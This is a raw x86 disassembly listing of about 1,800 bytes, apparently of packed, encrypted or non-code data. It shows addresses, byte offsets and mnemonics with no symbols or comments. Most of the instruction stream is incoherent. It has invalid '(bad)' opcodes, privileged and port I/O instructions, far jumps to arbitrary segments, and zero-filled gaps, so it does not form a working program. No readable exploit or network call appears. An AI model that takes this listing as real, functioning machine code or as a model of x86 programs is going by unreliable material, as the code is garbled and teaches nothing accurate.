  412e3b:	fbstp  TBYTE PTR [ecx]
  412e3d:	lea    eax,[ebx]
  412e3f:	cld    
  412e40:	xor    DWORD PTR [ebp+0x6a31e7fb],ecx
  412e46:	cmp    eax,0x561018d1
  412e4b:	adc    BYTE PTR [ebx+0x20b459fe],0xf8
  412e52:	cmp    DWORD PTR ds:[ecx+0x82],ecx
	...
  412e7d:	add    BYTE PTR [eax],al
  412e7f:	add    BYTE PTR [esi],bh
  412e81:	xor    al,0x2
  412e83:	mov    edi,ebx
  412e85:	pop    edx
  412e86:	pop    ebx
  412e87:	sahf   
  412e88:	imul   edx,eax,0x96c2afa4
  412e8e:	pop    ebx
  412e8f:	xor    edi,DWORD PTR [ebx-0x4cccb06a]
  412e95:	xchg   esi,eax
  412e96:	inc    ebx
  412e97:	xor    esp,DWORD PTR [edi+edx*2+0x332e183e]
  412e9e:	popa   
  412e9f:	xchg   ebp,eax
  412ea0:	or     BYTE PTR [ecx+0x6b],al
  412ea3:	and    BYTE PTR [esi],al
  412ea5:	pop    ebx
  412ea6:	pushf  
  412ea7:	add    DWORD PTR ds:[edi-0x75],edx
  412eab:	lea    edi,[esi+0x5b]
  412eae:	push   ss
  412eaf:	sahf   
  412eb0:	call   0x6e4955f5
  412eb5:	shr    DWORD PTR [eax-0xbf26fd],1
  412ebb:	popf   
  412ebc:	clc    
  412ebd:	push   esi
  412ebe:	jnp    0x412e4d
  412ec0:	jle    0x412f1d
  412ec2:	out    dx,al
  412ec3:	popf   
  412ec4:	rol    BYTE PTR [eax-0x19],0x17
  412ec8:	mov    dl,0x33
  412eca:	jmp    0x9647:0xaf40b09f
  412ed1:	pop    edx
  412ed2:	out    0x3,eax
  412ed4:	fadd   QWORD PTR ds:[eax+esi*1]
  412ed8:	enter  0xe79a,0x9c
  412edc:	or     eax,0x19df6a72
  412ee1:	shr    DWORD PTR [eax],1
  412ee3:	add    al,0x0
	...
  412f0d:	add    BYTE PTR [ecx+0x3a80c7c7],al
  412f13:	(bad)  
  412f14:	ins    DWORD PTR es:[edi],dx
  412f15:	inc    ebx
  412f16:	ds inc eax
  412f18:	sbb    al,0xf5
  412f1a:	loope  0x412ed5
  412f1c:	push   ecx
  412f1d:	inc    esp
  412f1e:	ds into 
  412f20:	sub    al,0xac
  412f22:	or     DWORD PTR [eax-0xb],eax
  412f25:	scas   eax,DWORD PTR es:[edi]
  412f26:	push   eax
  412f27:	mov    BYTE PTR [eax],0xe5
  412f2a:	stos   BYTE PTR es:[edi],al
  412f2b:	(bad)  
  412f2c:	or     BYTE PTR [ecx+0x66fe4332],al
  412f32:	add    eax,0x68e9111a
  412f37:	aam    0xec
  412f39:	push   0xfffffff6
  412f3b:	xor    edi,esi
  412f3d:	aam    0x35
  412f3f:	xor    edi,DWORD PTR [edi]
  412f41:	pushf  
  412f42:	mov    edx,0xc0d96b40
  412f47:	xchg   esi,eax
  412f48:	lock cdq 
  412f4a:	stos   BYTE PTR es:[edi],al
  412f4b:	(bad)  
  412f4c:	or     BYTE PTR [ecx+0x6a],al
  412f4f:	lods   eax,DWORD PTR ds:[esi]
  412f50:	std    
  412f51:	es inc edi
  412f53:	sbb    esi,DWORD PTR [ebp+eiz*8+0x4]
  412f57:	sbb    cl,BYTE PTR [ecx]
  412f59:	jmp    0x57a99a75
  412f5e:	push   ss
  412f5f:	call   0x1151:0x4b817400
  412f66:	sub    BYTE PTR [ebp+edi*8+0x741b36f6],ah
  412f6d:	in     eax,0xf4
  412f6f:	sbb    DWORD PTR [ecx],ecx
  412f71:	jmp    0x412f76
	...
  412f9a:	add    BYTE PTR [eax],al
  412f9c:	adc    BYTE PTR [esi+0x5b3de8ec],0x0
  412fa3:	add    BYTE PTR fs:[edi],ch
  412fa6:	push   ecx
  412fa7:	into   
  412fa8:	dec    eax
  412fa9:	push   ebx
  412faa:	call   0xfe818064
  412faf:	bnd jge 0x412f7d
  412fb2:	push   es
  412fb3:	push   0x28
  412fb5:	das    
  412fb6:	add    DWORD PTR [eax+edi*1],esi
  412fb9:	je     0x412f7b
  412fbb:	mov    al,0x7f
  412fbd:	push   edi
  412fbe:	add    BYTE PTR [ecx],bh
  412fc0:	addr16 adc ch,dl
  412fc3:	in     al,dx
  412fc4:	lods   al,BYTE PTR ds:[esi]
  412fc5:	aaa    
  412fc6:	jb     0x412fb0
  412fc8:	cld    
  412fc9:	push   ebx
  412fca:	rol    BYTE PTR [eax],0x5a
  412fcd:	out    0x55,al
  412fcf:	cmp    DWORD PTR [edi+0xf05735c],0x5c
  412fd6:	add    BYTE PTR [ecx],al
  412fd8:	push   edi
  412fd9:	(bad)  
  412fdb:	add    DWORD PTR [ebx],ebx
  412fdd:	pop    ecx
  412fde:	sub    eax,eax
  412fe0:	outs   dx,BYTE PTR ds:[esi]
  412fe1:	sbb    al,0x6
  412fe3:	add    BYTE PTR [esi+esi*2-0x31e8be72],dh
  412fea:	inc    esp
  412feb:	in     al,dx
  412fec:	mov    bh,0xdf
  412fee:	je     0x412ff8
  412ff0:	outs   dx,DWORD PTR ds:[esi]
  412ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff2:	push   esp
  412ff3:	call   DWORD PTR [eax-0x25]
  412ff6:	cmc    
  412ff7:	add    ebx,ecx
  412ff9:	push   ebp
  412ffa:	cmp    eax,0x830665e5
	...
  413028:	add    BYTE PTR [eax],al
  41302a:	shr    dh,cl
  41302c:	std    
  41302d:	je     0x413008
  41302f:	xor    edi,DWORD PTR [esi+0x5215c9]
  413035:	lea    ebp,[edx+0x4aff4dee]
  41303b:	push   edx
  41303c:	call   0xff20dad3
  413041:	or     edi,0x5c
  413044:	je     0x41304b
  413046:	and    al,0xdf
  413048:	push   DWORD PTR [ecx+ebx*4-0x2b]
  41304c:	jl     0x41303a
  41304e:	xchg   edi,eax
  41304f:	imul   eax,DWORD PTR [esi],0x2b
  413052:	xlat   BYTE PTR ds:[ebx]
  413053:	adc    al,al
  413055:	or     BYTE PTR [edi+0x37ec44d3],ah
  41305b:	loop   0x4130d1
  41305d:	or     BYTE PTR [edi+0x67],bh
  413060:	push   ebx
  413061:	call   eax
  413063:	dec    esi
  413064:	shl    BYTE PTR [ebp+0x69],0xd5
  413068:	jl     0x413056
  41306a:	imul   eax,DWORD PTR ds:0x3e2b,0xfffffff4
  413070:	retf   
  413071:	shl    DWORD PTR [esi],0x34
  413074:	mov    DWORD PTR [edx+ebp*2+0x64],eax
  413078:	cdq    
  413079:	je     0x4130c1
  41307b:	in     al,dx
  41307c:	xor    BYTE PTR [ebp+0x49],dl
  41307f:	lds    eax,FWORD PTR [ebp+0x46fef7]
  413085:	cmp    DWORD PTR [ebx+0x387504a8],0x69
  41308c:	(bad)  
  41308d:	enter  0x0,0x0
	...
  4130b5:	add    BYTE PTR [eax],al
  4130b7:	add    ah,bh
  4130b9:	cmp    eax,DWORD PTR [edx]
  4130bb:	lea    edi,[ebx-0x80]
  4130be:	xor    al,0xff
  4130c0:	xchg   ebx,eax
  4130c1:	dec    esp
  4130c2:	stos   BYTE PTR es:[edi],al
  4130c3:	imul   edi,DWORD PTR ss:[ebp-0x67],0xffffff82
  4130c8:	push   es
  4130c9:	push   esp
  4130ca:	clts   
  4130cc:	mov    ebp,0x72ffa5ee
  4130d1:	cs out dx,eax
  4130d3:	mov    edi,0xc7207
  4130d8:	mov    ebx,0xe14fa5ee
  4130dd:	out    0x9,al
  4130df:	call   0xfedc1018
  4130e4:	mov    ebp,0x4074e45b
  4130e9:	mov    cl,0x17
  4130eb:	in     al,dx
  4130ec:	ds (bad) 
  4130ee:	jmp    FWORD PTR [edx]
  4130f0:	jle    0x4130fc
  4130f2:	les    eax,FWORD PTR [edi]
  4130f4:	ds scas eax,DWORD PTR es:[edi]
  4130f6:	inc    eax
  4130f7:	in     al,dx
  4130f8:	push   cs
  4130f9:	call   0x25aa:0x3c2bfee4
  413100:	repz adc al,0x9b
  413103:	mov    ebx,?
  413105:	rdmsr  
  413107:	call   DWORD PTR [ebx]
  413109:	cmp    al,0xaa
  41310b:	xchg   ebp,eax
  41310c:	jmp    0xe85a:0x76829aec
  413113:	adc    eax,0x69fda45
  413118:	icebp  
  413119:	push   esp
  41311a:	push   0x18
	...
  413144:	add    BYTE PTR [eax],al
  413146:	push   edx
  413147:	pop    edx
  413148:	adc    al,0x2
  41314a:	and    eax,0x39c5b11b
  41314f:	pop    ebx
  413150:	dec    edx
  413151:	sub    edi,DWORD PTR [eax-0x5771865]
  413157:	sbb    BYTE PTR cs:[esi],ch
  41315a:	data16 cmp al,0xdd
  41315d:	or     esp,DWORD PTR [esi]
  41315f:	dec    ebx
  413160:	mov    ah,0x9a
  413162:	sub    BYTE PTR [ebp+ebx*1+0x5c5b6158],dh
  413169:	inc    eax
  41316a:	sub    ch,BYTE PTR [ecx+edx*8-0x1438eefc]
  413171:	call   0x3d08:0x273f5392
  413178:	das    
  413179:	int3   
  41317a:	call   DWORD PTR [ebx-0x19]
  41317d:	xor    ch,al
  41317f:	das    
  413180:	imul   edi,DWORD PTR [edi-0x6853311b],0x71
  413187:	xor    edx,DWORD PTR [eax]
  413189:	xor    ebx,ecx
  41318b:	cmp    al,0x7
  41318d:	adc    dl,dl
  41318f:	cmp    al,0x75
  413191:	pop    es
  413192:	(bad)  
  413193:	das    
  413194:	call   0x490f:0x2750c09a
  41319b:	cmp    al,0x5d
  41319d:	or     al,0xb1
  41319f:	(bad)  
  4131a0:	fld    TBYTE PTR [esp+eiz*2+0x3499d73d]
  4131a7:	sbb    edx,DWORD PTR [ebp+0x4]
	...
  4131d2:	add    BYTE PTR [eax],al
  4131d4:	cdq    
  4131d5:	mov    bl,0xac
  4131d8:	mov    gs,WORD PTR [ebx+0x197699be]
  4131de:	add    ebp,esp
  4131e0:	cmp    eax,0xd7bd89a6
  4131e5:	(bad)  
  4131e6:	or     al,0x91
  4131e8:	adc    ebx,DWORD PTR [edi+0x1b3b9efd]
  4131ee:	jne    0x4131ba
  4131f0:	mov    bh,0x10
  4131f3:	cmp    DWORD PTR [edx-0x4879a46d],ebp
  4131f9:	mov    WORD PTR [eax-0x80],gs
  4131fc:	in     al,0x7b
  4131fe:	add    BYTE PTR [esi+0x31],dh
  413201:	arpl   bp,di
  413203:	hlt    
  413204:	sub    DWORD PTR [ebp+edi*8-0x76ccba24],ecx
  41320b:	imul   eax,edi,0x6515e93c
  413211:	cmp    al,0xfe
  413213:	and    BYTE PTR [eax],al
  413215:	push   0x2fc29c00
  41321a:	imul   ebp,ecx,0xc1bf2c3d
  413220:	fwait
  413221:	mov    eax,0xc6d6e93f
  413226:	or     al,0x93
  413228:	repz cmp al,0x74
  41322b:	icebp  
  41322c:	xchg   ebp,eax
  41322d:	jmp    0x41322c
  41322f:	push   ss
  413230:	(bad)  
  413231:	mov    bl,0x0
  413233:	jmp    0x52aa2fde
	...
  413260:	add    BYTE PTR [eax],al
  413262:	push   ds
  413263:	call   0xd36a:0x4f38fe00
  41326a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41326b:	(bad)  
  41326c:	or     BYTE PTR [ecx],al
  41326e:	xor    eax,0x65e6fe3d
  413273:	pop    ebx
  413274:	add    dh,cl
  413276:	pop    es
  413277:	mov    ah,0xa2
  413279:	dec    ebp
  41327a:	std    
  41327b:	pop    edx
  41327c:	std    
  41327d:	push   esp
  41327e:	inc    esi
  41327f:	mov    cl,0x1c
  413281:	add    BYTE PTR [eax+0x4c],bh
  413284:	or     al,ch
  413286:	adc    eax,0xfffffee3
  41328b:	push   esi
  41328c:	add    bh,ch
  41328e:	jmp    0x26a5dc02
  413293:	push   edi
  413294:	std    
  413295:	jne    0x4132f2
  413297:	ins    DWORD PTR es:[edi],dx
  413298:	sbb    al,0xff
  41329a:	inc    edx
  41329b:	dec    edi
  41329c:	call   0xff23fb0c
  4132a1:	push   0xbeed5767
  4132a6:	das    
  4132a7:	mov    ch,0x61
  4132a9:	inc    ecx
  4132aa:	push   edi
  4132ab:	loop   0x413321
  4132ad:	or     al,0x3d
  4132af:	inc    eax
  4132b0:	push   DWORD PTR [ebp+0x2f]
  4132b3:	pop    es
  4132b4:	push   edx
  4132b5:	dec    DWORD PTR [eax+0x170065d3]
  4132bb:	add    al,0xbc
  4132bd:	push   0x3f5abc
  4132c2:	js     0x41332d
  4132c4:	or     al,0x6a
	...
  4132ee:	add    BYTE PTR [eax],al
  4132f0:	xor    al,0xd4
  4132f2:	je     0x4132fc
  4132f4:	jg     0x413307
  4132f6:	(bad)  
  4132f7:	jmp    FWORD PTR [eax]
  4132f9:	and    eax,0x89e708c0
  4132fe:	mov    esp,ebp
  413300:	push   esp
  413301:	cli    
  413302:	stc    
  413303:	push   0xffffffd7
  413305:	mov    BYTE PTR [edx],dh
  413307:	push   DWORD PTR [edx-0x4d32179a]
  41330d:	sar    esi,cl
  41330f:	mov    DWORD PTR [edx-0x4dbc9a2e],esp
  413315:	popf   
  413316:	add    bh,bh
  413318:	xor    ah,BYTE PTR [esi-0x18]
  41331b:	dec    ebp
  41331c:	cwde   
  41331d:	sar    dh,cl
  41331f:	call   DWORD PTR [edx]
  413321:	sar    esi,cl
  413323:	jne    0x413363
  413325:	cmp    al,0xaa
  413327:	div    ebx
  413329:	sub    BYTE PTR [esi+0x2487cc8],dl
  41332f:	push   ebp
  413330:	mov    ch,0x28
  413332:	add    bl,0x82
  413335:	sahf   
  413336:	add    al,0x6a
  413338:	sub    eax,0x66081009
  41333d:	loopne 0x41336e
  41333f:	jmp    FWORD PTR [ecx-0x55]
  413342:	aas    
  413343:	cld    
  413344:	(bad)  
  413345:	jne    0x413366
  413347:	inc    ecx
  413348:	ds jmp 0x40a73b5d
  41334e:	xchg   edi,eax
  41334f:	dec    BYTE PTR [ecx-0x47]
  413352:	paddb  mm0,QWORD PTR [eax]
	...
  41337d:	add    BYTE PTR [ecx+0x37],al
  413380:	or     ch,al
  413382:	add    DWORD PTR [edi-0x6b],ecx
  413385:	inc    BYTE PTR [edi]
  413387:	xchg   BYTE PTR [eax],al
  413389:	add    BYTE PTR [ebx-0x57d5753],dl
  41338f:	mov    ebp,DWORD PTR [edx]
  413391:	add    BYTE PTR [eax+edx*2-0x73b98b6b],ah
  413398:	sub    DWORD PTR [ebp+0x9],edx
  41339b:	jns    0x413328
  41339d:	inc    esp
  41339e:	add    bl,BYTE PTR [esi+esi*1]
  4133a1:	gs jg  0x4133e8
  4133a4:	xchg   edi,eax
  4133a5:	je     0x4133ed
  4133a7:	dec    esp
  4133a8:	test   eax,0x2a58e9fd
  4133ad:	add    BYTE PTR [esi-0x30],dl
  4133b0:	and    BYTE PTR [ecx+0x3e],al
  4133b3:	fsubr  QWORD PTR [ecx]
  4133b5:	gs jg  0x4133fc
  4133b8:	xchg   edi,eax
  4133b9:	xor    al,0x94
  4133bb:	jmp    0x413401
  4133bd:	add    dh,dl
  4133bf:	daa    
  4133c0:	cmp    edi,edi
  4133c2:	mov    ecx,0x7173c23c
  4133c7:	pop    ebx
  4133c8:	jo     0x41340a
  4133ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133cb:	ret    0x55e0
  4133ce:	popa   
  4133cf:	pop    ebx
  4133d0:	aas    
  4133d1:	add    al,0x3e
  4133d3:	dec    edx
  4133d4:	mov    gs,WORD PTR [ebx]
  4133d6:	fdivr  QWORD PTR [esi-0x5076fbd8]
  4133dc:	mov    edi,0xbf630a96
  4133e1:	rol    DWORD PTR [eax],1
	...
  41340b:	add    al,bh
  41340d:	cmp    DWORD PTR [edi+0x27f8772b],ebp
  413413:	add    al,0xd6
  413415:	pop    edx
  413416:	out    0xa6,eax
  413418:	mov    ds:0xff1f42c2,eax
  41341d:	pop    edx
  41341e:	mov    ss,WORD PTR [eax]
  413420:	push   esi
  413421:	cmp    ebp,edi
  413423:	or     edx,DWORD PTR [esi+0x52]
  413426:	(bad)  
  413427:	xchg   esi,eax
  413428:	inc    eax
  413429:	cmp    ebp,edi
  41342b:	fwait
  41342c:	and    DWORD PTR [ebx],esp
  41342e:	pop    ss
  41342f:	xchg   edi,eax
  413430:	xor    BYTE PTR [ecx],bh
  413432:	fst    QWORD PTR [edi-0x541050d8]
  413438:	mov    ss,WORD PTR gs:[esi-0x6a]
  41343c:	push   es
  41343d:	push   ds
  41343e:	in     al,0x3
  413440:	imul   esp,esp,0x53
  413443:	cmp    ch,0x37
  413446:	rol    BYTE PTR [ebx],cl
  413448:	xchg   esp,eax
  413449:	outs   dx,BYTE PTR ds:[esi]
  41344a:	adc    BYTE PTR ss:[esi+0x43],al
  41344e:	dec    eax
  41344f:	das    
  413450:	icebp  
  413451:	cmp    BYTE PTR [ecx+0x40],dh
  413454:	jmp    0x165b:0x7f206fc3
  41345b:	adc    BYTE PTR [esi+0x43],al
  41345e:	mov    BYTE PTR [ebp+0x100738d0],dl
  413464:	retf   0x7538
  413467:	or     edx,esi
  413469:	add    BYTE PTR fs:[eax+edx*8+0x2bc839],bl
	...
  413499:	add    BYTE PTR [ecx-0x298daac8],dh
  41349f:	ffree  st(4)
  4134a1:	fst    QWORD PTR [ebx+ebx*2+0x6a]
  4134a5:	pop    ds
  4134a6:	mov    bl,0xaf
  4134a8:	or     cl,al
  4134aa:	sbb    ecx,DWORD PTR [ebp+edi*8-0x3604a3a]
  4134b1:	push   ecx
  4134b2:	or     eax,0xd2e93fbf
  4134b7:	scas   eax,DWORD PTR es:[edi]
  4134b8:	or     cl,al
  4134ba:	pop    ebx
  4134bb:	ss (bad) 
  4134bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134be:	shr    DWORD PTR [edi+0x63319efc],cl
  4134c4:	call   0xfe79437c
  4134c9:	mov    al,ds:0x1c005c7c
  4134ce:	mov    bh,0x44
  4134d0:	and    BYTE PTR [ebp+0x300c2a6],0xb
  4134d7:	cmp    DWORD PTR [ecx+eiz*8-0x1b],esi
  4134db:	mov    ch,0x54
  4134dd:	shl    dx,cl
  4134e0:	inc    ebx
  4134e1:	pop    ebp
  4134e2:	push   edx
  4134e3:	aam    0x63
  4134e5:	test   al,0x3d
  4134e7:	cmp    BYTE PTR [ecx+eiz*8-0x1b],dh
  4134eb:	xor    eax,0x38b346fc
  4134f0:	je     0x41352f
  4134f2:	stos   DWORD PTR es:[edi],eax
  4134f3:	scas   al,BYTE PTR es:[edi]
  4134f4:	or     BYTE PTR [ecx+0x65],al
  4134f7:	mov    ebp,?
  4134f9:	cs add eax,0xe9051a
	...
  413527:	add    BYTE PTR [eax],bl
  413529:	in     al,0xec
  41352b:	push   0xfffffffe
  41352d:	xor    ebp,DWORD PTR [ebx-0x17]
  413530:	daa    
  413531:	jae    0x413530
  413533:	xchg   esp,eax
  413534:	inc    ebp
  413535:	inc    ebx
  413536:	dec    esp
  413537:	add    BYTE PTR [ebx-0x65760132],ch
  41353d:	iret   
  41353e:	mov    gs:0xff009cca,eax
  413544:	sub    ah,BYTE PTR [eax+ebp*8-0x33]
  413548:	mov    ds:0xafffece,al
  41354d:	sar    esi,cl
  41354f:	jne    0x4134f0
  413551:	add    esi,DWORD PTR [esi+0x54]
  413554:	or     dh,0xc8
  413557:	ret    0x5b9b
  41355a:	push   ebx
  41355b:	mov    esi,DWORD PTR [ebx-0x32]
  41355e:	je     0x41356c
  413560:	jg     0x4134fc
  413562:	pop    ecx
  413563:	jmp    DWORD PTR [eax+0x4274c062]
  413569:	xchg   DWORD PTR [esi+0x505f1665],esi
  41356f:	call   0x3ea714
  413574:	pop    ss
  413575:	into   
  413576:	je     0x413588
  413578:	daa    
  413579:	into   
  41357a:	je     0x413584
  41357c:	scas   eax,DWORD PTR es:[edi]
  41357d:	inc    ecx
  41357e:	xlat   BYTE PTR ds:[ebx]
  41357f:	push   DWORD PTR [eax-0x5fa937fe]
  413585:	iret   
  413586:	enter  0x33c2,0x5b
  41358a:	push   ebx
  41358b:	mov    eax,DWORD PTR [eax]
	...
  4135b5:	add    BYTE PTR [ebx-0x25],dh
  4135b8:	sar    eax,0xd8
  4135bb:	test   BYTE PTR [eax],al
  4135bd:	push   0x2e
  4135bf:	shl    BYTE PTR [eax+ecx*1+0x6f],1
  4135c3:	add    edx,DWORD PTR [ebx-0x1]
  4135c6:	inc    eax
  4135c7:	loope  0x41360d
  4135c9:	cld    
  4135ca:	pop    esp
  4135cb:	or     eax,0x5aa6482c
  4135d0:	cmp    BYTE PTR [edi],0xd7
  4135d3:	data16 jl 0x41363e
  4135d6:	jb     0x41362d
  4135d8:	aas    
  4135d9:	add    BYTE PTR [esi],bh
  4135db:	cmc    
  4135dc:	test   eax,0x2447d0d
  4135e1:	or     edi,esi
  4135e3:	mov    eax,0xe2d65734
  4135e8:	and    edi,edi
  4135ea:	mov    ecx,0xb73c239
  4135ef:	mov    ebx,0x97a9f83e
  4135f4:	mov    WORD PTR [ecx+0x44],gs
  4135f7:	adc    eax,0xc6a60818
  4135fc:	xchg   ecx,eax
  4135fd:	(bad)  
  4135fe:	xchg   ecx,eax
  4135ff:	and    eax,0x4014f818
  413604:	xchg   ebx,eax
  413605:	je     0x41363d
  413607:	or     al,0xc
  413609:	(bad)  
  41360a:	jns    0x4135f9
  41360c:	xchg   ecx,eax
  41360d:	je     0x413685
  41360f:	call   0x6b9a:0x2bf3fee5
  413616:	popa   
  413617:	aad    0x91
  413619:	add    BYTE PTR [bx+si],al
	...
  413644:	jle    0x4136ad
  413646:	inc    ebx
  413647:	add    BYTE PTR [ecx+0x4f],dl
  41364a:	mov    edi,fs
  41364c:	push   edx
  41364d:	jnp    0x4135e0
  41364f:	(bad)  
  413650:	xor    eax,0x8e121904
  413655:	lods   eax,DWORD PTR ds:[esi]
  413656:	pop    ss
  413657:	clc    
  413658:	mov    es,ebp
  41365a:	pop    ss
  41365b:	or     BYTE PTR [esi],dl
  41365d:	fnstsw WORD PTR [edx-0x2e73de02]
  413663:	push   ebp
  413664:	sbb    DWORD PTR [ebp-0x63e98b6f],ecx
  41366a:	fst    DWORD PTR [ebp+0x9]
  41366d:	popf   
  41366e:	nop
  41366f:	xor    bh,dh
  413671:	ficom  DWORD PTR [ecx-0x69930602]
  413677:	lods   eax,DWORD PTR ds:[esi]
  413678:	ss cmp eax,0x5ae98419
  41367e:	pushf  
  41367f:	(bad)  
  413680:	loopne 0x413631
  413682:	out    dx,eax
  413683:	fwait
  413684:	mov    ch,0x89
  413686:	push   ss
  413687:	xchg   ebx,eax
  413688:	jo     0x4136ae
  41368a:	sub    cl,BYTE PTR [eax]
  41368c:	ds nop
  41368e:	jb     0x413630
  413690:	shr    BYTE PTR [edi-0x6edc6415],0xf6
  413697:	xchg   edx,eax
  413698:	inc    esp
  413699:	sbb    esi,DWORD PTR [eax+esi*8+0x21]
  41369d:	es dec ebp
  41369f:	inc    ebp
  4136a0:	ds mov ecx,edi
  4136a3:	xchg   ebp,eax
  4136a4:	div    BYTE PTR ds:0x33d7
	...
  4136d2:	xchg   ecx,eax
  4136d3:	scas   eax,DWORD PTR es:[edi]
  4136d4:	div    DWORD PTR [ebx]
  4136d6:	mov    DWORD PTR [edi+0xcf29bef],ebp
  4136dc:	mov    edi,0x1d476192
  4136e1:	xchg   ebx,eax
  4136e2:	jo     0x413707
  4136e4:	stos   BYTE PTR es:[edi],al
  4136e5:	jmp    FWORD PTR [ecx-0x72]
  4136e8:	jb     0x413689
  4136ea:	mov    esp,0xe43aa01e
  4136ef:	pop    edx
  4136f0:	add    esi,ecx
  4136f2:	push   eax
  4136f3:	scas   eax,DWORD PTR es:[edi]
  4136f4:	fistp  WORD PTR [ebx-0x6d7975c5]
  4136fa:	mov    dh,0x9f
  4136fc:	jnp    0x41377c
  4136fe:	jp     0x413685
  413700:	pop    ds
  413701:	inc    ebp
  413702:	fld    TBYTE PTR ds:[esi-0x306d4dfd]
  413709:	mov    ebp,0x3ae79a9a
  41370e:	imul   ebp,DWORD PTR es:[ecx+0x27603e03],0x17
  413716:	dec    edx
  413717:	mov    WORD PTR [edi-0x78],cs
  41371a:	pusha  
  41371b:	xor    al,0x3f
  41371d:	(bad)  
  41371e:	mov    ecx,0x72fb00af
  413723:	lahf   
  413724:	clc    
  413725:	cs inc esi
  413727:	xor    ebp,DWORD PTR [ebx+0x3]
  41372a:	int    0xaf
  41372c:	or     BYTE PTR [ecx],dl
  41372e:	(bad)  
  41372f:	xor    eax,0xafac16fe
  413734:	clc    
  413735:	add    DWORD PTR [eax],0x0
	...
  413760:	fnstenv ds:0xb3a5f174
  413766:	std    
  413767:	dec    bh
  413769:	xor    eax,0x7852f174
  41376e:	std    
  41376f:	je     0x413716
  413771:	cmp    al,0x6d
  413773:	out    0xcf,al
  413775:	xor    eax,0x3cca54fe
  41377a:	jl     0x4137b8
  41377c:	scas   eax,DWORD PTR es:[edi]
  41377d:	xor    eax,0xf3821afd
  413782:	std    
  413783:	(bad)  
  413784:	scas   eax,DWORD PTR es:[edi]
  413785:	xor    eax,0x5d8a8ff3
  41378a:	jae    0x41371a
  41378c:	iret   
  41378d:	scas   eax,DWORD PTR es:[edi]
  41378e:	cld    
  41378f:	scas   al,BYTE PTR es:[edi]
  413790:	push   ecx
  413791:	arpl   ax,bp
  413793:	mov    ebp,DWORD PTR [eax]
  413795:	xor    al,0xfe
  413797:	ds xchg ebp,eax
  413799:	sbb    al,BYTE PTR ds:0xece008e9
  41379f:	push   0x76
  4137a1:	xor    BYTE PTR [esi+0x13],dl
  4137a4:	cmp    al,cl
  4137a6:	cmp    DWORD PTR [esi+0x51],edi
  4137a9:	arpl   ax,bp
  4137ab:	ins    DWORD PTR es:[edi],dx
  4137ac:	push   0x8160fe34
  4137b1:	aaa    
  4137b2:	mov    ah,BYTE PTR [esp+ebx*1]
  4137b5:	pushf  
  4137b6:	aas    
  4137b7:	jmp    0xdd41ac79
  4137bc:	jge    0x413781
  4137be:	fcmovb st,st(4)
  4137c0:	jl     0x41381d
  4137c2:	push   ebp
	...
  4137eb:	add    BYTE PTR [eax],al
  4137ed:	add    BYTE PTR [edi-0x3e],ch
  4137f0:	inc    eax
  4137f1:	add    bh,ah
  4137f3:	ss mov esi,0xe8724474
  4137f9:	sti    
  4137fa:	mov    ecx,0x170bfeca
  4137ff:	push   ebx
  413800:	pop    ss
  413801:	push   eax
  413802:	scas   eax,DWORD PTR es:[edi]
  413803:	push   edi
  413804:	add    bh,ch
  413806:	imul   edx,DWORD PTR [edi-0x1c],0x50579665
  41380d:	inc    DWORD PTR [edx+0x30]
  413810:	out    0x3,al
  413812:	cmp    ebx,ecx
  413814:	(bad)  
  413815:	call   0x3ea4b5
  41381a:	fwait
  41381b:	push   cs
  41381c:	mov    esi,0xfeca98b9
  413821:	push   DWORD PTR [ebp-0x47]
  413824:	xor    eax,0xff1ef207
  413829:	jne    0x4138a6
  41382b:	retf   0x874
  41382e:	outs   dx,DWORD PTR ds:[esi]
  41382f:	dec    eax
  413830:	push   edx
  413831:	(bad)  
  413832:	mov    eax,0x63c2c76a
  413837:	push   edi
  413838:	push   ebx
  413839:	mov    ebp,DWORD PTR [ebx-0x2b173e22]
  41383f:	and    al,0x3a
  413841:	dec    ebx
  413842:	es pop edi
  413844:	add    BYTE PTR [ebp+0x63],dh
  413847:	lock mov edi,0x55570c
  41384d:	push   0x57
  41384f:	push   ebp
  413850:	std    
  413851:	inc    DWORD PTR [eax]
	...
  41387b:	add    BYTE PTR [edx],dh
  41387d:	xor    ebp,DWORD PTR [eax+0x0]
  413880:	cmp    eax,0x5795e857
  413885:	push   edi
  413886:	add    BYTE PTR [ecx+0x75fee6d2],cl
  41388c:	lahf   
  41388d:	(bad)  
  41388e:	aam    0x54
  413890:	mov    DWORD PTR ds:[eax-0x6f5f7c78],edx
  413897:	je     0x41389f
  413899:	call   0x7490:0x7164fc16
  4138a0:	inc    edx
  4138a1:	push   ds
  4138a2:	add    ch,BYTE PTR [edx+0x3e]
  4138a5:	pushf  
  4138a6:	adc    al,0x40
  4138a8:	ds inc esp
  4138aa:	jg     0x4138f0
  4138ac:	shl    ah,cl
  4138ae:	sbb    eax,DWORD PTR [eax]
  4138b0:	fs inc esp
  4138b2:	sbb    al,0x12
  4138b4:	push   esp
  4138b5:	inc    esp
  4138b6:	xchg   ecx,eax
  4138b7:	je     0x41387b
  4138b9:	pop    ecx
  4138ba:	idiv   BYTE PTR [ebx]
  4138bc:	add    eax,0x7e850203
  4138c1:	cmp    DWORD PTR [edx-0x79],edi
  4138c4:	ds inc esp
  4138c6:	add    cl,BYTE PTR [ebx+0x117a100b]
  4138cc:	retf   
  4138cd:	ja     0x413863
  4138cf:	dec    edi
  4138d0:	and    al,0x44
  4138d2:	sbb    BYTE PTR [edx],dl
  4138d4:	adc    al,0x44
  4138d6:	sbb    cl,BYTE PTR [ecx]
  4138d8:	sbb    BYTE PTR [ebx-0x180c00fc],al
  4138de:	lea    edx,[ecx+0x0]
	...
  413909:	add    BYTE PTR [esi-0x41],cl
  41390c:	les    esi,FWORD PTR [edi+0x9]
  41390f:	add    DWORD PTR [eax],ebx
  413911:	lock push esi
  413913:	test   BYTE PTR [eax-0x1],al
  413916:	pop    ecx
  413917:	stos   DWORD PTR es:[edi],eax
  413918:	inc    edi
  413919:	call   0x485a3d63
  41391e:	dec    ecx
  41391f:	inc    edi
  413920:	pushf  
  413921:	out    0xd2,eax
  413923:	dec    edi
  413924:	(bad)  
  413925:	inc    bh
  413927:	jbe    0x4138c9
  413929:	(bad)  
  41392a:	stos   DWORD PTR es:[edi],eax
  41392b:	mov    ah,0x9c
  41392d:	push   edx
  41392e:	js     0x4138f1
  413930:	(bad)  
  413931:	(bad)  
  413932:	stos   DWORD PTR es:[edi],eax
  413933:	pop    ebx
  413934:	dec    edi
  413935:	(bad)  
